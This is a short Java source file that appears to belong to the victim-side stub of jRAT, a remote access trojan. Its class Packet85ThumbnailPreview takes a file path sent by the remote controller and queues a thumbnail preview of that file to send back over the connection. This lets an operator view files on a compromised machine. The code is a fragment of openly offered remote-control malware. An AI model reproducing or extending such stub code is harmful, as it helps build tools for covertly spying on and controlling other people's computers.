package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		con.addToSendQueue(new Packet59ThumbnailPreview(file));
	}

}
